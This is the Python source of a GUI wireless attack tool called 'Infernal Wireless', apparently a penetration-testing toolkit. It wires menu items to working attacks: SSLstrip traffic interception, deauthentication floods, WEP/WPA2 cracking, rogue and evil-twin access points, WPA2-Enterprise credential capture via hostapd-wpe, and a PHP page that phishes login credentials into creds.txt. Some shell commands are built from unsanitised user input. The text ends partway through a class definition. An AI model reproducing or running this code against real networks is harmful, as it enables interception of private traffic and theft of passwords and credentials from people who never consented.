import wx
import project_form
#from scapy.all import *
import commands, re
import wless_commands
from scapy.all import *
import os
import time
from subprocess import *
from bs4 import BeautifulSoup
from wp2_crack import *
import create_db_hotspot
import urllib2, httplib, redirecthandle
import wx.html
import notepad
import fakePagecreate
import ntlm_hashes
import access_to_db
class Example(wx.Frame):
	
	def __init__(self, *args, **kw):
		super(Example, self).__init__(*args, **kw)
		
		

		self.InitUI()
	

	def InitUI(self):
		
		#################### setting up the menu bar ###################		
		menubar = wx.MenuBar()
		
		######### file menu ######333
		fileMenu = wx.Menu()
		
		
		configsrv = fileMenu.Append(-1, "Configure Software", "Configure the software")
		report_menu = fileMenu.Append(-1, "Generate Report", "Generate Report")
		notepad_menu = fileMenu.Append(-1, "Notepad", "Notepad")
		
		fitem = fileMenu.Append(wx.ID_EXIT, 'Quit', 'Quit application')
		menubar.Append(fileMenu, '&File')
		
		############ tools menu
		toolbar1 = wx.Menu()
		tshark = toolbar1.Append(-1, "Tshark", 'Sniff the network')
		sslstrip2 = toolbar1.Append(-1, "SSL Strip", "SSL Strip")
		
		deauth_usermenu = toolbar1.Append(-1, "Deauth User", "Deauthenticate Users")
		deauth_all = toolbar1.Append(-1, "Deauthenticate Everyone", "Deauthenticate Everyone")
		kill_all = toolbar1.Append(-1, "Kill Srv", "Kill Infernal Wireless")
		
		
		menubar.Append(toolbar1, "Tools")
		
		#################### Wireless Recon ###########
		reconmenu = wx.Menu()
		probrecon = reconmenu.Append(-1, "Probe Request Check", "Check Probe Request")
		wirelessScanner = reconmenu.Append(-1, "Scan Wireless", "Scan for Wireless Network")
		
		menubar.Append(reconmenu, 'Recon Wireless')
		
		
		
		############## attack bar #######
		
		attackbar = wx.Menu()
		attackitem = attackbar.Append(-1, 'Pop up/ask password','pop up box password')
		fakelogin = attackbar.Append(-1, "Fake login page", "Create a fake login page")
		menubar.Append(attackbar, 'Attack Vectors')
		
		
		
		
		############ wireless security ##########

		wirelessbar = wx.Menu()
		wpa2_hack = wirelessbar.Append(-1, 'Hack WPA2','Hacking WPA2')
		wpe2entr = wirelessbar.Append(-1, "Hack WPA2 Entr", "Hacking WPA2 Enterprise")
		
		imp = wx.Menu()
		cmpIVs = imp.Append(-1, 'Caputre IVs', 'Caputre IVs')
		fakeAuthenticate = imp.Append(-1, "Perform Fake Authentication", "Perform Fake Authentication")
		replaymode =imp.Append(-1, "ARP Requeste Replay Mode", "ARP Requeste Replay Mode")
		crackwep = imp.Append(-1,'Crack WEP Hashes','Crack WEP Hashes')
		
		
		wirelessbar.AppendMenu(-1, 'WEP Hacking', imp)
		evltwin = wirelessbar.Append(-1, 'Evil Twin Attack', 'Perform Evil Twin attack')
		infernalwireless = wirelessbar.Append(-1, "Perform Infernal Wireless Attack")
		freeInternet = wirelessbar.Append(-1, "Free Internet", "Create Free Internet")

		menubar.Append(wirelessbar, "Wireless Hacking")
		
		
		############## WEP SUBMENU###############
		
		
		
	
		
		############### Cracking Hashes #########
		crackbar = wx.Menu()
		WPA2crack = crackbar.Append(-1,'Crack WPA2 Hashes','Crack WPA2 Hashes')
		WPA2ENTcrack = crackbar.Append(-1,'Crack WPA2ENT Hashes','Crack WPA2 Enterprise Hashes')
		menubar.Append(crackbar, 'Cracking')
		
		
		################## LOG FILES ###########
		logmenu = wx.Menu()
		loginlog = logmenu.Append(-1, "Login Creds", "Check for login credentials")
		WPA2_log = logmenu.Append(-1, "WPA2", "WPA2 Cracks")
		WPA2ENT_log = logmenu.Append(-1, "WPA2ENT", "WPA2Ent Logs")
		CC_log = logmenu.Append(-1, "Credit Card", "CC Logs")
		session_log = logmenu.Append(-1,"HTTP Session Log", "HTTP Session Log")
		db_log = logmenu.Append(-1,"Db Log", "DB Log")
		menubar.Append(logmenu, "Logs")
		
		################### About ###########
		
		aboutmenu = wx.Menu()
		abouttool = aboutmenu.Append(-1, "About Tool", "About Tool")
		aboutme = aboutmenu.Append(-1, "About Author", "About me")
		suggestions = aboutmenu.Append(-1, "Suggestions/feedback","Suggestions/feedback")
		menubar.Append(aboutmenu,"About")
		




		self.SetMenuBar(menubar)
#~ 
		############ assigning functions to the menu items
		self.Bind(wx.EVT_MENU, self.OnQuit, fitem)
		
		self.Bind(wx.EVT_MENU, self.configure, configsrv)
		
		self.Bind(wx.EVT_MENU, self.saveNotes, notepad_menu)
		
		self.Bind(wx.EVT_MENU, self.tshark_capture, tshark)
		
		self.Bind(wx.EVT_MENU, self.sslStrip, sslstrip2)
		
		## todo : I need to create a function to deauth specific user ##
		
		
		self.Bind(wx.EVT_MENU, self.deauth_ssid, deauth_all)
		
		self.Bind(wx.EVT_MENU, self.killall, kill_all)
		
		self.Bind(wx.EVT_MENU, self.probRequest, probrecon)
		
		self.Bind(wx.EVT_MENU, self.wireless_scan, wirelessScanner)
		
		self.Bind(wx.EVT_MENU, self.fake_page_create, fakelogin)
		
		self.Bind(wx.EVT_MENU, self.wpa_crack, wpa2_hack)
		
		self.Bind(wx.EVT_MENU, self.wpe_ssid_get, wpe2entr)
		
		self.Bind(wx.EVT_MENU, self.printme, evltwin)
		
		self.Bind(wx.EVT_MENU, self.infernalWireless, infernalwireless)
		
		self.Bind(wx.EVT_MENU, self.free_evil, freeInternet)
		
		self.Bind(wx.EVT_MENU, self.deauth_user, deauth_usermenu)
		
		self.Bind(wx.EVT_MENU, self.fakepopup, attackitem)
		
		self.Bind(wx.EVT_MENU, self.captureIV, cmpIVs)
		
		self.Bind(wx.EVT_MENU, self.fakeAPauth, fakeAuthenticate)
		
		self.Bind(wx.EVT_MENU, self.wep_replay, replaymode)
		
		self.Bind(wx.EVT_MENU, self.wep_crack, crackwep)
		
		self.Bind(wx.EVT_MENU, self.wp2_cracker, WPA2crack)
		
		self.Bind(wx.EVT_MENU, self.wpa2ent_cracker, WPA2ENTcrack)
		
		self.Bind(wx.EVT_MENU, self.wpa2ent_log, WPA2ENT_log)
		
		#self.Bind(wx.EVT_MENU, self.createProject, fProject)
		#fProject
		
		self.Bind(wx.EVT_MENU, self.db_log_access, db_log)
		
		
		self.Bind(wx.EVT_MENU, self.about_tool, abouttool)
		
		self.Bind(wx.EVT_MENU, self.about_author, aboutme)
		
		self.Bind(wx.EVT_MENU, self.suggestions, suggestions)
		
		#self.Bind(wx.EVT_MENU, self.printme, attackitem)
		
		
		


		#################### setting up the menu bar ###################
		
		pnl = wx.Panel(self)

		######### spider 
		start_image = wx.Image("spider.png")
		start_image.Rescale(180, 140)
		image = wx.BitmapFromImage(start_image) 
		pic=wx.StaticBitmap(pnl, -1, image, pos=(200, 50), style=wx.BITMAP_TYPE_PNG)
		
		
		######## logo
		start_image2 = wx.Image("scorpion.png")
		start_image2.Rescale(200, 150)
		image2 = wx.BitmapFromImage(start_image2) 
		pic2=wx.StaticBitmap(pnl, -1, image2, pos=(800, 20), style=wx.BITMAP_TYPE_PNG)
		
		#~ 
#		pic.SetBitmap(wx.Bitmap("spider.png"))
		#~ 
		###################################################################################################
		################### THIS SECTION IS WORKING BUT COMMENTED OUT FOR DEBUGGING PURPOSE################
		###################################################################################################
		#~ attackbtn = wx.Button(pnl, label='Attack Methods', pos=(20,30))
		#~ attackbtn.Bind(wx.EVT_BUTTON, self.OnClose)
		#~ attackbtn.SetToolTip(wx.ToolTip("Accompanying attacks for MiTM over wireles"))
		#~ 
		#~ toolbtn = wx.Button(pnl, label='TShark', pos=(150,30))
		#~ toolbtn.Bind(wx.EVT_BUTTON, self.tshark_capture)
		#~ toolbtn.SetToolTip(wx.ToolTip("Start capturing data via TShark"))
		#~ 
		#~ confbtn = wx.Button(pnl, label='Configure', pos=(250,30))
		#~ confbtn.Bind(wx.EVT_BUTTON, self.configure)
		#~ confbtn.SetToolTip(wx.ToolTip("Configure the database and install pre-req."))
		#~ 
		#~ Logsbtn = wx.Button(pnl, label='Logs', pos=(350,30))
		#~ Logsbtn.Bind(wx.EVT_BUTTON, self.printme)
		#~ Logsbtn.SetToolTip(wx.ToolTip("Log files of the tool"))
		#~ 
		#~ aboutbtn = wx.Button(pnl, label='About', pos=(450,30))
		#~ aboutbtn.Bind(wx.EVT_BUTTON, self.printme)
		#~ aboutbtn.SetToolTip(wx.ToolTip("About the author, tool and bug report"))
		#~ 
		#~ fakepagebtn = wx.Button(pnl, label='View Faked Page', pos=(450,30))
		#~ fakepagebtn.Bind(wx.EVT_BUTTON, self.viewFakedPage)
		#~ fakepagebtn.SetToolTip(wx.ToolTip("View Faked page"))
		#~ 
		#~ killbtn = wx.Button(pnl, label='Kill Srv', pos=(590,30))
		#~ killbtn.Bind(wx.EVT_BUTTON, self.killall)
		#~ killbtn.SetToolTip(wx.ToolTip("Kill background services"))
		#~ 
		#~ freebtn = wx.Button(pnl, label='Free Internet', pos=(700,30))
		#~ freebtn.Bind(wx.EVT_BUTTON, self.free_evil)
		#~ freebtn.SetToolTip(wx.ToolTip("Create free fake Internet"))
		#~ #aboutbtn.SetBackgroundColour('BLUE')
		#~ 
#~ 
#~ ############### CONFIGURE BELOW BUTTONS		
		#~ 
		#~ ifcbtn = wx.Button(pnl, label='Notepad', pos=(20,90))
		#~ ifcbtn.Bind(wx.EVT_BUTTON, self.saveNotes)
		#~ ifcbtn.SetToolTip(wx.ToolTip("Opens a notepad for notes, tasks and more"))
		#~ 
		#~ dbbtn = wx.Button(pnl, label='Sniff Probs', pos=(150,90))
		#~ dbbtn.Bind(wx.EVT_BUTTON, self.probRequest)
		#~ dbbtn.SetToolTip(wx.ToolTip("Sniff Probe requests"))
		#~ 
		#~ evtwbtn = wx.Button(pnl, label='Evil Twin', pos=(450,90))
		#~ evtwbtn.Bind(wx.EVT_BUTTON, self.test)
		#~ evtwbtn.SetToolTip(wx.ToolTip("Create an Evil Twin attack"))
		#~ 
		#~ inwlbtn = wx.Button(pnl, label='Infernal Wireless', pos=(550,90))
		#~ inwlbtn.Bind(wx.EVT_BUTTON, self.infernalWireless)
		#~ inwlbtn.SetToolTip(wx.ToolTip("Create Infernal Wireless Attack"))
		#~ 
		#~ snprobbtn = wx.Button(pnl, label='Deauth SSID', pos=(700,90))
		#~ snprobbtn.Bind(wx.EVT_BUTTON, self.deauth_ssid)
		#~ snprobbtn.SetToolTip(wx.ToolTip("Send Deauthentication request to SSID"))
		#~ 
		#~ 
		#~ 
#~ ############## configure second below buttons
#~ 
		#~ ifcbtn2 = wx.Button(pnl, label='Scan Range  ', pos=(20,150))
		#~ ifcbtn2.Bind(wx.EVT_BUTTON, self.wireless_scan)
		#~ ifcbtn2.SetToolTip(wx.ToolTip("Scan wireless range"))
		#~ 
		#~ dbbtn = wx.Button(pnl, label='Fake Login', pos=(150,150))
		#~ dbbtn.Bind(wx.EVT_BUTTON, self.fake_page_create)
		#~ dbbtn.SetToolTip(wx.ToolTip("Create a fake login page for Social Engineering attack"))
		#~ 
		#~ evtwbtn = wx.Button(pnl, label='Enable SSL', pos=(450,150))
		#~ evtwbtn.Bind(wx.EVT_BUTTON, self.sslStrip)
		#~ evtwbtn.SetToolTip(wx.ToolTip("Enable SSL Strip to sniff SSL enabled pages"))
		#~ 
		#~ inwlbtn = wx.Button(pnl, label='WPA2 Ent. Hack ', pos=(550,150))
		#~ inwlbtn.Bind(wx.EVT_BUTTON, self.wpe_ssid_get)
		#~ inwlbtn.SetToolTip(wx.ToolTip("WPA2 Enterprise Hacking via hostapd and radius server"))
		#~ 
		#~ snprobbtn2 = wx.Button(pnl, label='WPA/2 Attack', pos=(700,150))
		#~ snprobbtn2.Bind(wx.EVT_BUTTON, self.wpa_crack)
		#~ snprobbtn2.SetToolTip(wx.ToolTip("WPA/2 attack"))
		
		###################################################################################################
		################### THIS SECTION IS WORKING BUT COMMENTED OUT FOR DEBUGGING PURPOSE################
		###################################################################################################
		
		read_only_txt = wx.TextCtrl(pnl, -1, '', style=wx.TE_MULTILINE|wx.TE_READONLY, pos=(20, 200),size=(500,600))
		 
		#wireless_scan = wx.TextCtrl(pnl, -1, "wireless can results will be displayed here", style=wx.TE_MULTILINE,pos=(450, 200),size=(400,300))
		
		
		##~ snotebtn = wx.Button(pnl, label='Save Note ', pos=(450,515))
		##~ snotebtn.Bind(wx.EVT_BUTTON, self.saveNotes)
		
		
		#Notes = wx.TextCtrl(pnl, -1, "Attacker can take notes here", style=wx.TE_MULTILINE,pos=(450, 550),size=(400,250)).GetValue()
		#Notes_gui = wx.TextCtrl(pnl, -1, "Attacker can take notes here", style=wx.TE_MULTILINE,pos=(450, 550),size=(400,250)).GetValue()
		
		
		view_logs = wx.TextCtrl(pnl, -1, 'Logs will be displayed here', style=wx.TE_MULTILINE|wx.TE_READONLY, pos=(680, 200),size=(500,600))
		#~ 
		#~ myList = ['ssl strip', 'DB logs', 'Credentials','CC Info','session cookies', 'Media', 'NTLM Hashes']
		#~ combo_box = wx.ComboBox(pnl, id=-1, value="View Logs", pos=(880, 150), size=(160, 30), choices=myList, style=0, name='logs')		
		

		#test = WPA2_crack.crack_wpa2_handshake()
		
########### I need to work on it tomorrow		
		#~ wpa2Crackbtn = wx.Button(pnl, label='Crack WPA2 HSK ', pos=(880, 100))
#~ 
		#~ wpa2Crackbtn.Bind(wx.EVT_BUTTON, self.wp2_cracker)
		#~ wpa2Crackbtn.SetToolTip(wx.ToolTip("Crack WPA2 handshakes"))
		
########### I need to work on it tomorrow

		self.SetSize((1200,900))
		self.SetTitle('Infernal Wireless')
		self.Centre()
		self.Show(True)

		########### text aread ######
	def OnQuit(self, e):
		self.Close()
		
	def killall(self, e):
		os.system("kill  `ps aux | grep hostapd | head -1 | awk '{print $2}'`")
		os.system("kill  `ps aux | grep dnsmasq | head -1 | awk '{print $2}'`")
		os.system("airmon-ng stop mon0")
		os.system("airmon-ng stop mon1")
		os.system("airmon-ng stop mon2")
		os.system("airmon-ng stop mon3")
		os.system("kill  `ps aux | grep aircrack-ng | head -1 | awk '{print $2}'`")
		os.system("kill  `ps aux | grep radiusd | head -1 | awk '{print $2}'`")
		
	def OnClose(self, e):
		self.Close(True)
	
	def sslStrip(self, e):
		os.system("""iptables --flush
		iptables --table nat --flush
		iptables --delete-chain
		iptables --table nat --delete-chain
		iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-ports 10000
		iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
		iptables -A FORWARD -i wlan0 -o eth0 -j ACCEPT""")

		os.system("gnome-terminal -x sslstrip -akf")
		
	def printme(self, e):
		print 'Hello World'
	
	def about_tool(self, e):
		
		frm = MyHtmlFrame2(None,'About the tool')
		frm.Show()
		
	def about_author(self, e):
		
		frm = authorwindows(None,'About Author')
		frm.Show()
	
	def createProject(self, e):
		project_form.create_new_project()
		
	def wpa2ent_log(self, e):
		
		ntlm_hashes.launch_ntlm_cracker()
	def db_log_access(self, e):
		access_to_db.access_to_database()
		
	def suggestions(self, e):
		frm = suggestions(None,'Suggestions')
		frm.Show()
	
	def tshark_capture(self, e):
		os.system("gnome-terminal -x tshark -i any tcp port 80 or tcp port 443 -V -w network_capture.cap &")
	
	def saveNotes(self, data):
		
		notepad.openit()
	
	def fake_page_create(self, e):
		fakePagecreate.openit()
	
	def ask(parent=None, message='', default_value=''):
				dlg = wx.TextEntryDialog(parent, message, defaultValue=default_value)
				dlg.ShowModal()
				result = dlg.GetValue()
				dlg.Destroy()
				return result
	
	def configure(self, e):
		os.system("apt-get install -y hostapd dnsmasq wireless-tools iw wvdial &")
	
	def deauth_user(self, e):
		
		#os.system("airmon-ng start wlan0")
		ssid = str(self.ask(message = 'Enter the SSID')).strip()
		MAC = str(self.ask(message = 'Enter the MAC')).strip()
		os.system("aireplay-ng -0 10 -e "+ssid+" -c "+MAC+" mon0 --ignore-negative-one &") 
		
		
	
	def deauth_ssid(self, e):
		#os.system("airmon-ng start wlan0")
		ssid = str(self.ask(message = 'Enter the SSID')).strip()
		os.system("aireplay-ng -0 10 -e "+ssid+" mon0 --ignore-negative-one &") 
		#~ os.system("airmon-ng stop mon0")
	
	################  FREE INTERNET ###############
	def free_evil(self, e):

		hostapd = open('/etc/hostapd/hostapd.conf', 'wb')
			#~ config_file = "interface="+wireless_interface+"\ndriver=nl80211\nssid=thisisme\nchannel=1\n#enable_karma=1\n"
		config_file = "interface=wlan0\ndriver=nl80211\nssid=Free Internet\nchannel=1\n#enable_karma=1\n"
		hostapd.write(config_file)
		hostapd.close()
		os.system("service hostapd start")
		
		os.system("""sed -i 's#^DAEMON_CONF=.*#DAEMON_CONF=/etc/hostapd/hostapd.conf#' /etc/init.d/hostapd
		cat <<EOF > /etc/dnsmasq.conf
log-facility=/var/log/dnsmasq.log
#address=/#/10.0.0.1
#address=/google.com/10.0.0.1
interface=wlan0
dhcp-range=10.0.0.10,10.0.0.250,12h
dhcp-option=3,10.0.0.1
dhcp-option=6,10.0.0.1
#no-resolv
log-queries
EOF""")

		os.system("service dnsmasq start")

		
		os.system("""ifconfig wlan0 up
		ifconfig wlan0 10.0.0.1/24
		iptables -t nat -F
		iptables -F
		iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
		iptables -A FORWARD -i wlan0 -o eth0 -j ACCEPT
		echo '1' > /proc/sys/net/ipv4/ip_forward""")
	
	################ FREE INTERNET ################	
		
		######################### wireless scanner is ready #################
	def wireless_scan(self,e):
		os.system("ifconfig wlan0 up")
		read_only_txt = wx.TextCtrl(self, -1, '**WIRELESS SCAN**\n', style=wx.TE_MULTILINE|wx.TE_READONLY, pos=(20, 200),size=(400,600))
		output = str(commands.getstatusoutput("iw wlan0 scan")[1])

		p = r'SSID: \S*|cipher: \S*|Authentication suites: \S*'
		p = r'SSID: \S*|cipher: \S*'
		match = re.findall(p, output)
		grouped = list(zip(*[iter(match)] * 2))
		wireless_ssid_file = open('wScan.log', 'a')
		for i in grouped:
			#print sorted(i)
			read_only_txt.AppendText(str(sorted(i))+'\n')
			wireless_ssid_file.write(str(sorted(i))+'\n')
		wireless_ssid_file.close()
		
		######################### wireless scanner is ready #################

			
		######################### probe scanner is ready #################
	def probRequest(self, e):
		read_only_txt = wx.TextCtrl(self, -1, '**PROBE REQUEST**\n', style=wx.TE_MULTILINE|wx.TE_READONLY, pos=(20, 200),size=(400,600))
		wless_commands.start_probing()
		with open('prob_request.txt') as f:
			for i in f:
				if i.strip() != '':
					read_only_txt.AppendText(str(i))
	######################### probe scanner is ready #################			
	
    #~ def test(self,e):
		#~ self.new = NewWindow(parent=None, id=-1)
        #~ self.new.Show()	
	def test(self, e):
		self.new = EvilWindow(parent=None, id=-1)
		self.new.Show()
	
	
	
	def wpe_ssid_get(self, e):
		
		def ask(parent=None, message='', default_value=''):
			dlg = wx.TextEntryDialog(parent, message, defaultValue=default_value)
			dlg.ShowModal()
			result = dlg.GetValue()
			dlg.Destroy()
			return result
		
		user = str(ask(message = 'Enter the WPA2 Entr.SSID')).strip()
		
		self.wpa2_entr_crack(user)
		
	def captureIV(self, e):
		
		def ask(parent=None, message='', default_value=''):
			dlg = wx.TextEntryDialog(parent, message, defaultValue=default_value)
			dlg.ShowModal()
			result = dlg.GetValue()
			dlg.Destroy()
			return result
		ask_mac = str(ask(message = 'Enter the AP MAC Address')).strip()
		self.target_mac = ask_mac 
		os.system("gnome-terminal -x airodump-ng -c 9 --bssid "+ask_mac+" -w output mon0 &")
	
	def fakeAPauth(self, e):
		
		def ask(parent=None, message='', default_value=''):
			dlg = wx.TextEntryDialog(parent, message, defaultValue=default_value)
			dlg.ShowModal()
			result = dlg.GetValue()
			dlg.Destroy()
			return result
			
		ask_mac = str(ask(message = 'Enter the AP MAC Address')).strip()
		host_mac = str(ask(message = 'Enter the HOST MAC Address')).strip()
		ssid = str(ask(message = 'Enter victim SSID')).strip()
		 
		os.system("gnome-terminal -x aireplay-ng -1 0 -e "+ssid+" -a "+ask_mac+" -h "+host_mac+" mon0 &")
	
	def wep_replay(self, e):
		def ask(parent=None, message='', default_value=''):
			dlg = wx.TextEntryDialog(parent, message, defaultValue=default_value)
			dlg.ShowModal()
			result = dlg.GetValue()
			dlg.Destroy()
			return result
			
		ask_mac = str(ask(message = 'Enter the AP MAC Address')).strip()
		host_mac = str(ask(message = 'Enter the HOST MAC Address')).strip()		
		
		os.system("gnome-terminal -x aireplay-ng -3 -b "+ask_mac+" -h "+host_mac+" mon0 &")
	
	def wep_crack(self, e):
		
		
		os.system("gnome-terminal -x aircrack-ng -b "+captureIV.target_mac+" output*.cap &")
		os.system("gnome-terminal -x aircrack-ng -K -b "+captureIV.target_mac+" output*.cap &")
	
	def fakepopup(self, e):
		
		def ask(parent=None, message='', default_value=''):
			dlg = wx.TextEntryDialog(parent, message, defaultValue=default_value)
			dlg.ShowModal()
			result = dlg.GetValue()
			dlg.Destroy()
			return result
		
		target_url = str(ask(message = 'Where do you want to redirct the users after')).strip()
		
		phpcode = """<?php 

$line = date('Y-m-d H:i:s') . " - $_SERVER[REMOTE_ADDR]";
file_put_contents('visitors.log', $line . PHP_EOL, FILE_APPEND);

if((empty($_SERVER['PHP_AUTH_USER']) or empty($_SERVER['PHP_AUTH_PW'])) and isset($_REQUEST['BAD_HOSTING']) and preg_match('/Basic\s+(.*)$/i', $_REQUEST['BAD_HOSTING'], $matc))
        list($_SERVER['PHP_AUTH_USER'], $_SERVER['PHP_AUTH_PW']) = explode(':', base64_decode($matc[1]));

  if (!isset($_SERVER['PHP_AUTH_USER'])) {
    header('WWW-Authenticate: Basic realm="My Realm"');
    header('HTTP/1.0 401 Unauthorized');
    echo 'Text to send if user hits Cancel button\n';
    exit;
  } else {
    
     $file = 'creds.txt';

     $user_pass = "{$_SERVER['PHP_AUTH_USER']} : {$_SERVER['PHP_AUTH_PW']} \n";

     file_put_contents($file, $user_pass, FILE_APPEND);

     header( 'Location: %s');

  }
?>

"""%target_url
		
		indexfile=open('/var/www/index.php','wb')
		indexfile.write(phpcode)
		indexfile.close()
		
		htaccess = open('/var/www/.htaccess','wb')
		htaccess.write("""<IfModule mod_rewrite.c>
   RewriteEngine on
   
   RewriteCond %{QUERY_STRING} ^$
   RewriteRule ([^\s]+).php$ $1.php?BAD_HOSTING=%{HTTP:Authorization}
   
   RewriteCond %{QUERY_STRING} ^(.+)$
   RewriteRule ([^\s]+).php $1.php?%1&BAD_HOSTING=%{HTTP:Authorization}
</IfModule>""")
		htaccess.close()
	
	def wpa2_entr_crack(self, SSID):
		
		#~ configuration = """interface=wlan0
#~ driver=nl80211
#~ ssid="%s"
#~ logger_stdout=-1
#~ logger_stdout_level=0
#~ dump_file=/tmp/hostapd.dump
#~ ieee8021x=1
#~ eapol_key_index_workaround=0
#~ own_ip_addr=127.0.0.1
#~ auth_server_addr=127.0.0.1
#~ auth_server_port=1812
#~ auth_server_shared_secret=testing123
#~ wpa=1
#~ channel=1
#~ wpa_pairwise=TKIP CCMP""" %SSID
		#~ 
		
		configuration = """interface=wlan0
driver=nl80211
ssid=%s
country_code=DE
logger_stdout=-1
logger_stdout_level=0
dump_file=/tmp/hostapd.dump
ieee8021x=1
eapol_key_index_workaround=0
own_ip_addr=127.0.0.1
auth_server_addr=127.0.0.1
auth_server_port=1812
auth_server_shared_secret=testing123
auth_algs=3
wpa=2
wpa_key_mgmt=WPA-EAP
channel=6
wpa_pairwise=CCMP
rsn_pairwise=CCMP
""" %SSID
		
		hostapd_conf = open('hostapd-wpe.conf', 'wb')
		hostapd_conf.write(configuration)
		hostapd_conf.close()
		os.system("gnome-terminal -x radiusd -X &")
		os.system("/usr/local/etc/raddb/certs/bootstrap &")
		
		os.system("airmon-ng start wlan0 &")
		
		os.system("gnome-terminal -x hostapd hostapd-wpe.conf &")
		os.system("gnome-terminal -x tail -f /usr/local/var/log/radius/freeradius-server-wpe.log &")
		
		
		
		
		
	
	
	def infernalWireless(self, e):
		self.new = infernal_wireless(parent=None, id=-1)
		self.new.Show()
			
	def wpa_crack(self, e):
		self.new = WPA2_crack(parent=None, id=-1)
		self.new.Show()
	
	def wp2_cracker(self, e):
		self.new = wpa_cracker(parent=None, id=-1)
		self.new.Show()
	
	def wpa2ent_cracker(self, e):
		self.new = wpa2enterprise_cracker(parent=None, id=-1)
		self.new.Show()
		
	def viewFakedPage(self, e):
		#self.new = MyHtmlFrame(parent=None, id=-1)
		#self.new.Show()
		os.system('firefox http://localhost/index.html &')

class wpa_cracker(wx.Frame):
	
	
    def __init__(self, parent, id):
      wx.Frame.__init__(self, parent, id)
      
      panel = wx.Panel(self,-1)
      #wx.StaticText(panel, -1, 'See Logs for results\ncaptures/key_found.txt', (45, 25), style=wx.ALIGN_CENTRE)
      

      self.CreateStatusBar()
      
      #~ menuBar = wx.MenuBar()
      #~ menu = wx.Menu()
      #~ menu.Append(99,  "&WPA2 Cracker", "Crack WPA/WPA2 handshakes")
      #~ menuBar.Append(menu, "&Load Dictionary File")
      #~ self.SetMenuBar(menuBar)
      #~ self.Bind(wx.EVT_MENU, self.openfile, id=99)
      
      
      wbtn = wx.Button(panel, label='Choose wordlist', pos=(10,40))
      wbtn.Bind(wx.EVT_BUTTON, self.openfile)
      
      capbtn = wx.Button(panel, label='Choose capture file',pos=(10,80))
      capbtn.Bind(wx.EVT_BUTTON, self.openhash)
      
      brutebtn = wx.Button(panel, label='Start bruteforce',pos=(10,120))
      brutebtn.Bind(wx.EVT_BUTTON, self.bruteforce)
      
      
    wordlist = ""
    capturelist = ""
	  
    def openhash(self, event):
		
       dlg = wx.FileDialog(self, "Choose a file", os.getcwd(), "", "*.*", wx.OPEN)
       
       if dlg.ShowModal() == wx.ID_OK:
		   
                path = dlg.GetPath()
                self.mypath = os.path.basename(path)
                self.SetStatusText("You selected: %s" % self.mypath)
        
       self.wordlist = str(path)
       
       dlg.Destroy()
		
		
   
		
    
    def openfile(self, event):
		
       dlg = wx.FileDialog(self, "Choose a file", os.getcwd(), "", "*.*", wx.OPEN)
       
       if dlg.ShowModal() == wx.ID_OK:
		   
                path = dlg.GetPath()
                self.mypath = os.path.basename(path)
                self.SetStatusText("You selected: %s" % self.mypath)
                
                
                #os.system("gnome-terminal -x aircrack-ng -w "+str(path)+" captures/*.cap -l captures/key_found.txt")
		self.capturelist = str(path)	
		dlg.Destroy() 
		
	 
    def bruteforce(self, event):
		
		
		
		os.system("gnome-terminal -x aircrack-ng -w "+self.wordlist+" "+self.capturelist+" -l captures/key_found.txt")
		
		#~ print self.capturelist
		#~ print self.wordlist
		#~ 
		   


class wpa2enterprise_cracker(wx.Frame):
	
	
    def __init__(self, parent, id):
      wx.Frame.__init__(self, parent, id)
      
      panel = wx.Panel(self,-1)
      #wx.StaticText(panel, -1, 'See Logs for results\ncaptures/key_found.txt', (45, 25), style=wx.ALIGN_CENTRE)
      
      g_challenge =  ""
      g_response = ""
    
      self.CreateStatusBar()
      
      #~ menuBar = wx.MenuBar()
      #~ menu = wx.Menu()
      #~ menu.Append(99,  "&WPA2 Cracker", "Crack WPA/WPA2 handshakes")
      #~ menuBar.Append(menu, "&Load Dictionary File")
      #~ self.SetMenuBar(menuBar)
      #~ self.Bind(wx.EVT_MENU, self.openfile, id=99)
      
      
      wbtn = wx.Button(panel, label='Choose wordlist', pos=(10,40))
      wbtn.Bind(wx.EVT_BUTTON, self.openfile)
      
      challenge = wx.TextCtrl(self, -1, "Enter the Challenge", size=(250, 30),pos=(10,80)).GetValue()
      response =  wx.TextCtrl(self, -1, "Enter the Response",size=(250, 30),pos=(10,120)).GetValue()
      self.g_challenge = str(challenge)
      self.g_response = str(response)
      
      #~ capbtn = wx.Button(panel, label='Choose capture file',pos=(10,80))
      #~ capbtn.Bind(wx.EVT_BUTTON, self.openhash)
      
      brutebtn = wx.Button(panel, label='Start bruteforce',pos=(10,170))
      brutebtn.Bind(wx.EVT_BUTTON, self.bruteforce)
      
      
	   
	
      
    wordlist = ""

    
    
    
    def openhash(self, event):
		
       dlg = wx.FileDialog(self, "Choose a file", os.getcwd(), "", "*.*", wx.OPEN)
       
       if dlg.ShowModal() == wx.ID_OK:
		   
                path = dlg.GetPath()
                self.mypath = os.path.basename(path)
                self.SetStatusText("You selected: %s" % self.mypath)
        
       self.wordlist = str(path)
       
       dlg.Destroy()
		
		
   
		
    
    def openfile(self, event):
		
       dlg = wx.FileDialog(self, "Choose a file", os.getcwd(), "", "*.*", wx.OPEN)
       
       if dlg.ShowModal() == wx.ID_OK:
		   
                path = dlg.GetPath()
                self.mypath = os.path.basename(path)
                self.SetStatusText("You selected: %s" % self.mypath)
                
                
                #os.system("gnome-terminal -x aircrack-ng -w "+str(path)+" captures/*.cap -l captures/key_found.txt")
		self.capturelist = str(path)	
		dlg.Destroy() 
		
	 
    def bruteforce(self, event):
		
		
		
		os.system("gnome-terminal -x asleap -C "+self.g_challenge+" -R "+self.g_response+" -W "+self.wordlist)
		
		#~ print self.g_challenge
		#~ print self.g_response
		

class MyHtmlFrame(wx.Frame):
	def __init__(self, parent, id):
		wx.Frame.__init__(self, parent, id, size=(800,600))
		html = wx.html.HtmlWindow(self)
		if "gtk2" in wx.PlatformInfo:
			html.SetStandardFonts()
		
		html.LoadPage("http://localhost/index.html")

class MyHtmlFrame2(wx.Frame):
	def __init__(self, parent, title):
		wx.Frame.__init__(self, parent, -1, title)
		html = wx.html.HtmlWindow(self)
		html.SetPage(
			"<font color=\"red\">This tool was developed to aid penetration tester in evaluating the security of wireless network</font> !!!! "
			"<br><font color=\"red\"></font>")

class authorwindows(wx.Frame):
	def __init__(self, parent, title):
		wx.Frame.__init__(self, parent, -1, title)
		html = wx.html.HtmlWindow(self)
		html.SetPage("3nt0py")

class suggestions(wx.Frame):
	def __init__(self, parent, title):
		wx.Frame.__init__(self, parent, -1, title)
		html = wx.html.HtmlWindow(self)
		html.SetPage("For suggestions and all other questions email me @ 3ntr0py1337@gmail.com")
		
class EvilWindow(wx.Frame):
	
